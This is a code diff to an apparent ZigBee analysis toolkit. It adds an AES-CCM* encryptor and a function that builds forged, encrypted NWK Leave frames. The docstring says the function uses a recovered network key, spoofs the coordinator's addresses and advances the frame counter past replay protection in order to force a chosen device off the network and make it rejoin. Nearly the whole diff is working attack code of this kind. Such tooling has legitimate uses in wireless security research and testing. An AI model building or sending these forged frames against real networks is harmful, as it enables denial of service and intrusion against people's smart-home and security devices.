@@ -253,6 +253,70 @@ def ccm_decrypt(key: bytes, nonce: bytes, aad: bytes, ct: bytes, mic: bytes):
     return pt, tag == mic
 
 
+def ccm_encrypt(key: bytes, nonce: bytes, aad: bytes, pt: bytes):
+    """AES-CCM* encrypt (13-byte nonce, 4-byte MIC, L=2) -- the inverse of
+    ccm_decrypt. Returns (ciphertext, mic)."""
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    enc = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
+    blk = lambda b: enc.update(b)
+    xor = lambda x, y: bytes(i ^ j for i, j in zip(x, y))
+    ctr = lambda i: blk(bytes([1]) + nonce + i.to_bytes(2, "big"))
+    mic_len = 4
+    flags = (0x40 if aad else 0) | (((mic_len - 2) // 2) << 3) | 1
+    x = blk(bytes([flags]) + nonce + len(pt).to_bytes(2, "big"))
+    data = (len(aad).to_bytes(2, "big") + aad) if aad else b""
+    data += b"\0" * (-len(data) % 16)
+    data += pt + b"\0" * (-len(pt) % 16)
+    for i in range(0, len(data), 16):
+        x = blk(xor(x, data[i:i + 16]))
+    mic = xor(x[:mic_len], ctr(0)[:mic_len])
+    ct = b"".join(xor(pt[i:i + 16], ctr(i // 16 + 1)) for i in range(0, len(pt), 16))
+    return ct, mic
+
+
+# NWK Leave command (command id 0x04). Options bits: 0x40 request, 0x20 remove
+# children, 0x80 rejoin. ZigBee spec 05-3474 section 3.4.4.
+NWK_CMD_LEAVE = 0x04
+
+
+def build_nwk_leave(nwk_key: bytes, target_short: int, src_short: int, dst_pan: int,
+                    src_ieee: int, frame_counter: int, key_seq: int,
+                    rejoin: bool = True, remove_children: bool = False,
+                    request: bool = True, mac_seq: int = 0, nwk_seq: int = 0,
+                    radius: int = 1):
+    """Build a NWK-secured Leave command (MAC data frame) to force `target_short`
+    to leave and (by default) rejoin. The frame counter must be ahead of the
+    target's last-seen value; src_ieee/src_short spoof the sender (e.g. the
+    coordinator). The NWK security is CCM* level 5 with the recovered nwk_key,
+    the exact inverse of nwk_decrypt. Radio adds the MAC FCS. Returns the MAC
+    frame bytes (without the 1-byte PHR length)."""
+    if len(nwk_key) != 16:
+        raise ValueError("nwk_key must be 16 bytes")
+
+    # MAC header: data, PAN-ID compression, short dst+src.
+    mac_fcf = 0x0001 | 0x0040 | (2 << 10) | (2 << 14)      # type=data, panidcomp, dst/src short
+    mac = struct.pack("<HBH", mac_fcf, mac_seq & 0xFF, dst_pan)
+    mac += struct.pack("<H", target_short) + struct.pack("<H", src_short)
+
+    # NWK header: command frame, security on, src IEEE in aux.
+    nwk_fcf = 0x01 | (2 << 2) | 0x0200                      # ftype=cmd, protover=2, security
+    nwk_hdr = struct.pack("<HHHBB", nwk_fcf, target_short, src_short, radius, nwk_seq & 0xFF)
+
+    ctrl_air = 0x28                                         # key_id=1 (nwk key), ext nonce; level=0 on air
+    ctrl_cry = (ctrl_air & ~7) | 5                          # level forced to 5 for crypto
+    aux_rest = (struct.pack("<I", frame_counter) + struct.pack("<Q", src_ieee) +
+                bytes([key_seq & 0xFF]))
+    nonce = struct.pack("<Q", src_ieee) + struct.pack("<I", frame_counter) + bytes([ctrl_cry])
+    aad = nwk_hdr + bytes([ctrl_cry]) + aux_rest
+
+    options = (0x80 if rejoin else 0) | (0x20 if remove_children else 0) | (0x40 if request else 0)
+    payload = bytes([NWK_CMD_LEAVE, options])
+    ct, mic = ccm_encrypt(nwk_key, nonce, aad, payload)
+
+    nwk = nwk_hdr + bytes([ctrl_air]) + aux_rest + ct + mic
+    return mac + nwk
+
+
 APS_FRAME_TYPES = {0: "data", 1: "command", 2: "ack", 3: "interpan"}
 
 # APS Transport-Key command (command ID 0x05), key-type byte -> name.
